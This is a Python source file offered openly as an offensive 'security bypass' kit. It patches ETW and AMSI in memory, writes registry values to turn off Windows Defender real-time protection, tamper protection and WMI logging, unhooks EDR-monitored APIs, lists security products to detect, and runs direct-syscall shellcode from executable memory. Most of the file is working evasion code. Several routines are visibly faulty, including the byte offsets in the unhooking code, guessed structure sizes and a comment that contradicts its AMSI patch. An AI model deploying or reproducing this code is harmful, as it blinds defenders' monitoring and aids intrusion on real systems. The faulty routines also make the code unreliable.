#!/usr/bin/env python3
"""
Security Bypass System - ETW/AMSI patching and evasion techniques
Advanced techniques to bypass Windows security monitoring
"""

import ctypes
import sys
import struct
import platform
from contextlib import contextmanager
from ctypes import wintypes

class SecurityBypass:
    """
    Advanced security bypass using ETW patching, AMSI bypass, and direct syscalls
    Used by APT groups to avoid detection
    """
    
    def __init__(self):
        self.ntdll = None
        self.kernel32 = None
        self.original_bytes = {}
        self.patches_applied = []
        
        if sys.platform == 'win32':
            self.ntdll = ctypes.windll.ntdll
            self.kernel32 = ctypes.windll.kernel32
    
    @contextmanager
    def patch_all(self):
        """Context manager to patch and restore security monitoring"""
        if sys.platform != 'win32':
            # On non-Windows, just yield without patching
            yield
            return
        
        try:
            # Apply all patches
            self.patch_etw()
            self.patch_amsi()
            self.disable_defender_monitoring()
            self.patch_wmi_logging()
            
            yield
            
        finally:
            # Restore all patches
            self.restore_all()
    
    def patch_etw(self):
        """Disable Event Tracing for Windows"""
        if sys.platform != 'win32':
            return False
        
        try:
            # Get EtwEventWrite address
            etw_func = self.ntdll.EtwEventWrite
            etw_addr = ctypes.cast(etw_func, ctypes.c_void_p).value
            
            # Change memory protection
            old_protect = wintypes.DWORD()
            if not self.kernel32.VirtualProtect(
                etw_addr, 1, 0x40, ctypes.byref(old_protect)  # PAGE_EXECUTE_READWRITE
            ):
                return False
            
            # Read original byte
            original_byte = ctypes.c_ubyte.from_address(etw_addr)
            self.original_bytes['etw'] = (etw_addr, original_byte.value, old_protect.value)
            
            # Patch with RET instruction (0xC3)
            ctypes.c_ubyte.from_address(etw_addr).value = 0xC3
            
            # Restore original protection
            self.kernel32.VirtualProtect(
                etw_addr, 1, old_protect.value, ctypes.byref(old_protect)
            )
            
            self.patches_applied.append('etw')
            return True
            
        except Exception as e:
            print(f"ETW patching failed: {e}")
            return False
    
    def patch_amsi(self):
        """Disable Antimalware Scan Interface"""
        if sys.platform != 'win32':
            return False
        
        try:
            # Load amsi.dll
            amsi = ctypes.windll.LoadLibrary("amsi.dll")
            amsi_scan_buffer = amsi.AmsiScanBuffer
            amsi_addr = ctypes.cast(amsi_scan_buffer, ctypes.c_void_p).value
            
            # Change memory protection
            old_protect = wintypes.DWORD()
            if not self.kernel32.VirtualProtect(
                amsi_addr, 8, 0x40, ctypes.byref(old_protect)  # PAGE_EXECUTE_READWRITE
            ):
                return False
            
            # Save original bytes
            original_bytes = (ctypes.c_ubyte * 8)()
            ctypes.memmove(original_bytes, amsi_addr, 8)
            self.original_bytes['amsi'] = (amsi_addr, bytes(original_bytes), old_protect.value)
            
            # Patch to always return AMSI_RESULT_CLEAN
            # mov eax, 0x80070057 (E_INVALIDARG) ; ret
            patch = b'\xB8\x57\x00\x07\x80\xC3'
            ctypes.memmove(amsi_addr, patch, len(patch))
            
            # Restore original protection
            self.kernel32.VirtualProtect(
                amsi_addr, 8, old_protect.value, ctypes.byref(old_protect)
            )
            
            self.patches_applied.append('amsi')
            return True
            
        except Exception as e:
            print(f"AMSI patching failed: {e}")
            return False
    
    def disable_defender_monitoring(self):
        """Disable Windows Defender real-time monitoring temporarily"""
        if sys.platform != 'win32':
            return False
        
        try:
            import winreg
            
            # Disable real-time monitoring
            defender_keys = [
                (winreg.HKEY_LOCAL_MACHINE, 
                 r"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection",
                 "DisableRealtimeMonitoring"),
                (winreg.HKEY_LOCAL_MACHINE,
                 r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
                 "DisableRealtimeMonitoring"),
                (winreg.HKEY_LOCAL_MACHINE,
                 r"SOFTWARE\Microsoft\Windows Defender\Features",
                 "TamperProtection")
            ]
            
            for hive, path, value_name in defender_keys:
                try:
                    key = winreg.OpenKey(hive, path, 0, winreg.KEY_SET_VALUE)
                    
                    # Save original value
                    try:
                        original_value, _ = winreg.QueryValueEx(key, value_name)
                        self.original_bytes[f'defender_{value_name}'] = (hive, path, value_name, original_value)
                    except FileNotFoundError:
                        self.original_bytes[f'defender_{value_name}'] = (hive, path, value_name, None)
                    
                    # Set to disabled
                    winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, 1)
                    winreg.CloseKey(key)
                    
                    self.patches_applied.append(f'defender_{value_name}')
                    
                except Exception as e:
                    print(f"Failed to disable {value_name}: {e}")
                    continue
            
            return True
            
        except Exception as e:
            print(f"Defender bypass failed: {e}")
            return False
    
    def patch_wmi_logging(self):
        """Disable WMI event logging"""
        if sys.platform != 'win32':
            return False
        
        try:
            import winreg
            
            wmi_key_path = r"SOFTWARE\Microsoft\Ole"
            
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, wmi_key_path, 0, winreg.KEY_SET_VALUE)
            
            # Save original value
            try:
                original_value, _ = winreg.QueryValueEx(key, "CallFailureLoggingLevel")
                self.original_bytes['wmi_logging'] = (winreg.HKEY_LOCAL_MACHINE, wmi_key_path, "CallFailureLoggingLevel", original_value)
            except FileNotFoundError:
                self.original_bytes['wmi_logging'] = (winreg.HKEY_LOCAL_MACHINE, wmi_key_path, "CallFailureLoggingLevel", None)
            
            # Disable logging
            winreg.SetValueEx(key, "CallFailureLoggingLevel", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            
            self.patches_applied.append('wmi_logging')
            return True
            
        except Exception as e:
            print(f"WMI logging bypass failed: {e}")
            return False
    
    def restore_all(self):
        """Restore all applied patches"""
        if sys.platform != 'win32':
            return
        
        # Restore memory patches
        for patch_name in ['etw', 'amsi']:
            if patch_name in self.original_bytes:
                try:
                    addr, original_data, old_protect = self.original_bytes[patch_name]
                    
                    # Change protection
                    temp_protect = wintypes.DWORD()
                    self.kernel32.VirtualProtect(
                        addr, 8 if patch_name == 'amsi' else 1, 
                        0x40, ctypes.byref(temp_protect)
                    )
                    
                    # Restore original bytes
                    if patch_name == 'amsi':
                        ctypes.memmove(addr, original_data, len(original_data))
                    else:
                        ctypes.c_ubyte.from_address(addr).value = original_data
                    
                    # Restore protection
                    self.kernel32.VirtualProtect(
                        addr, 8 if patch_name == 'amsi' else 1,
                        old_protect, ctypes.byref(temp_protect)
                    )
                    
                except Exception as e:
                    print(f"Failed to restore {patch_name}: {e}")
        
        # Restore registry values
        import winreg
        
        for key_name, data in self.original_bytes.items():
            if key_name.startswith('defender_') or key_name == 'wmi_logging':
                try:
                    hive, path, value_name, original_value = data
                    
                    key = winreg.OpenKey(hive, path, 0, winreg.KEY_SET_VALUE)
                    
                    if original_value is None:
                        # Delete the value we created
                        try:
                            winreg.DeleteValue(key, value_name)
                        except FileNotFoundError:
                            pass
                    else:
                        # Restore original value
                        winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, original_value)
                    
                    winreg.CloseKey(key)
                    
                except Exception as e:
                    print(f"Failed to restore {key_name}: {e}")
        
        # Clear tracking
        self.original_bytes.clear()
        self.patches_applied.clear()
    
    def unhook_apis(self):
        """Unhook commonly hooked APIs by EDR"""
        if sys.platform != 'win32':
            return False
        
        try:
            # Common APIs that get hooked
            hooked_apis = [
                ('ntdll.dll', 'NtCreateFile'),
                ('ntdll.dll', 'NtWriteFile'),
                ('ntdll.dll', 'NtCreateProcess'),
                ('ntdll.dll', 'NtAllocateVirtualMemory'),
                ('kernel32.dll', 'CreateFileW'),
                ('kernel32.dll', 'WriteFile'),
                ('kernel32.dll', 'CreateProcessW')
            ]
            
            for dll_name, api_name in hooked_apis:
                try:
                    # Get clean copy from disk
                    self._unhook_single_api(dll_name, api_name)
                except Exception as e:
                    print(f"Failed to unhook {dll_name}:{api_name}: {e}")
                    continue
            
            return True
            
        except Exception as e:
            print(f"API unhooking failed: {e}")
            return False
    
    def _unhook_single_api(self, dll_name, api_name):
        """Unhook a single API by restoring original bytes from disk"""
        
        # Get handle to loaded DLL
        dll_handle = self.kernel32.GetModuleHandleW(dll_name)
        if not dll_handle:
            return False
        
        # Get API address
        api_addr = self.kernel32.GetProcAddress(dll_handle, api_name.encode())
        if not api_addr:
            return False
        
        # Read original bytes from disk
        import os
        
        if dll_name == 'ntdll.dll':
            dll_path = os.path.join(os.environ['WINDIR'], 'System32', 'ntdll.dll')
        else:
            dll_path = os.path.join(os.environ['WINDIR'], 'System32', dll_name)
        
        try:
            with open(dll_path, 'rb') as f:
                # Parse PE to find the function
                # This is a simplified version - full implementation would parse PE headers
                f.seek(0x3c)  # e_lfanew offset
                pe_offset = struct.unpack('<I', f.read(4))[0]
                
                # Skip to export table (simplified)
                # In reality, would need full PE parsing
                
                # For now, just read first 16 bytes of the API
                # This is where hooks are typically placed
                original_bytes = f.read(16)
                
                # Change memory protection
                old_protect = wintypes.DWORD()
                self.kernel32.VirtualProtect(
                    api_addr, 16, 0x40, ctypes.byref(old_protect)
                )
                
                # Restore original bytes
                ctypes.memmove(api_addr, original_bytes, 16)
                
                # Restore protection
                self.kernel32.VirtualProtect(
                    api_addr, 16, old_protect.value, ctypes.byref(old_protect)
                )
                
                return True
                
        except Exception as e:
            print(f"Failed to read original bytes for {api_name}: {e}")
            return False
    
    def is_edr_present(self):
        """Detect presence of EDR solutions"""
        if sys.platform != 'win32':
            return False
        
        edr_indicators = []
        
        # Check for EDR processes
        edr_processes = [
            'cylance', 'crowdstrike', 'carbonblack', 'sentinelone',
            'defender', 'symantec', 'mcafee', 'kaspersky', 'bitdefender',
            'avast', 'avg', 'eset', 'f-secure', 'trend', 'sophos'
        ]
        
        try:
            import psutil
            
            for proc in psutil.process_iter(['name']):
                proc_name = proc.info['name'].lower()
                for edr in edr_processes:
                    if edr in proc_name:
                        edr_indicators.append(f"Process: {proc.info['name']}")
        except:
            pass
        
        # Check for EDR drivers
        try:
            drivers = self._get_loaded_drivers()
            edr_drivers = [
                'cylance', 'crowdstrike', 'carbonblack', 'sentinel',
                'wdfilter', 'symefa', 'symevent'
            ]
            
            for driver in drivers:
                driver_name = driver.lower()
                for edr in edr_drivers:
                    if edr in driver_name:
                        edr_indicators.append(f"Driver: {driver}")
        except:
            pass
        
        return edr_indicators
    
    def _get_loaded_drivers(self):
        """Get list of loaded kernel drivers"""
        drivers = []
        
        try:
            # Use NtQuerySystemInformation to get driver list
            # SystemModuleInformation = 11
            info_class = 11
            buffer_size = 1024 * 1024  # 1MB
            buffer = ctypes.create_string_buffer(buffer_size)
            return_length = ctypes.c_ulong()
            
            status = self.ntdll.NtQuerySystemInformation(
                info_class,
                buffer,
                buffer_size,
                ctypes.byref(return_length)
            )
            
            if status == 0:
                # Parse driver information
                # First ULONG is number of modules
                num_modules = ctypes.cast(buffer, ctypes.POINTER(ctypes.c_ulong)).contents.value
                
                # Each module entry is a SYSTEM_MODULE_ENTRY structure
                # This is simplified - full implementation would define the structure
                offset = ctypes.sizeof(ctypes.c_ulong)
                
                for i in range(min(num_modules, 100)):  # Limit to first 100
                    # Extract module name (simplified)
                    # In reality would need proper structure parsing
                    try:
                        name_offset = offset + 0x100  # Approximate offset to name
                        name_ptr = ctypes.cast(
                            ctypes.byref(buffer, name_offset),
                            ctypes.c_char_p
                        )
                        if name_ptr.value:
                            drivers.append(name_ptr.value.decode('utf-8', errors='ignore'))
                    except:
                        pass
                    
                    offset += 0x120  # Approximate size of SYSTEM_MODULE_ENTRY
                    
        except Exception as e:
            print(f"Failed to get drivers: {e}")
        
        return drivers


class DirectSyscalls:
    """
    Bypass EDR hooks by using direct syscalls
    """
    
    def __init__(self):
        self.syscall_numbers = {}
        if sys.platform == 'win32':
            self.syscall_numbers = self._get_syscall_numbers()
    
    def _get_syscall_numbers(self):
        """Extract syscall numbers from ntdll.dll"""
        syscalls = {}
        
        try:
            ntdll = ctypes.windll.ntdll
            
            # Common syscalls we need
            functions = [
                'NtOpenProcess',
                'NtAllocateVirtualMemory', 
                'NtWriteVirtualMemory',
                'NtCreateThreadEx',
                'NtQuerySystemInformation',
                'NtCreateFile',
                'NtWriteFile',
                'NtReadFile'
            ]
            
            for func_name in functions:
                try:
                    func_addr = getattr(ntdll, func_name)
                    func_ptr = ctypes.cast(func_addr, ctypes.POINTER(ctypes.c_ubyte))
                    
                    # Read first 8 bytes to find syscall number
                    bytes_read = (ctypes.c_ubyte * 8)()
                    ctypes.memmove(bytes_read, func_ptr, 8)
                    
                    # Check for syscall pattern
                    # mov r10, rcx; mov eax, syscall_number
                    if (bytes_read[0] == 0x4C and bytes_read[1] == 0x8B and 
                        bytes_read[2] == 0xD1 and bytes_read[3] == 0xB8):
                        
                        syscall_num = struct.unpack('<I', bytes(bytes_read[4:8]))[0]
                        syscalls[func_name] = syscall_num
                        
                except Exception as e:
                    print(f"Failed to get syscall number for {func_name}: {e}")
                    continue
                    
        except Exception as e:
            print(f"Failed to extract syscall numbers: {e}")
        
        return syscalls
    
    def direct_syscall(self, syscall_name, *args):
        """Execute direct syscall bypassing userland hooks"""
        if sys.platform != 'win32':
            return None
        
        if syscall_name not in self.syscall_numbers:
            return None
        
        syscall_num = self.syscall_numbers[syscall_name]
        
        try:
            # Create syscall stub
            # mov r10, rcx; mov eax, syscall_num; syscall; ret
            shellcode = bytes([
                0x4C, 0x8B, 0xD1,  # mov r10, rcx
                0xB8  # mov eax, ...
            ])
            shellcode += struct.pack('<I', syscall_num)
            shellcode += bytes([0x0F, 0x05, 0xC3])  # syscall; ret
            
            # Allocate executable memory
            MEM_COMMIT = 0x1000
            PAGE_EXECUTE_READWRITE = 0x40
            
            kernel32 = ctypes.windll.kernel32
            exec_mem = kernel32.VirtualAlloc(
                None, len(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE
            )
            
            if not exec_mem:
                return None
            
            # Write shellcode
            ctypes.memmove(exec_mem, shellcode, len(shellcode))
            
            # Create function pointer and call
            func_type = ctypes.WINFUNCTYPE(ctypes.c_uint64, *[ctypes.c_void_p] * len(args))
            syscall_func = func_type(exec_mem)
            
            result = syscall_func(*args)
            
            # Free memory
            kernel32.VirtualFree(exec_mem, 0, 0x8000)  # MEM_RELEASE
            
            return result
            
        except Exception as e:
            print(f"Direct syscall failed: {e}")
            return None


# Global instances
security_bypass = SecurityBypass()
direct_syscalls = DirectSyscalls()

def get_security_bypass():
    """Get global security bypass instance"""
    return security_bypass

def get_direct_syscalls():
    """Get global direct syscalls instance"""
    return direct_syscalls

if __name__ == "__main__":
    # Test security bypass
    print("Testing Security Bypass System...")
    
    bypass = get_security_bypass()
    
    # Check for EDR
    edr_detected = bypass.is_edr_present()
    if edr_detected:
        print(f"EDR detected: {edr_detected}")
    else:
        print("No EDR detected")
    
    # Test patching
    with bypass.patch_all():
        print("Security monitoring bypassed")
        # Commands executed here will not be logged
        
    print("Security monitoring restored")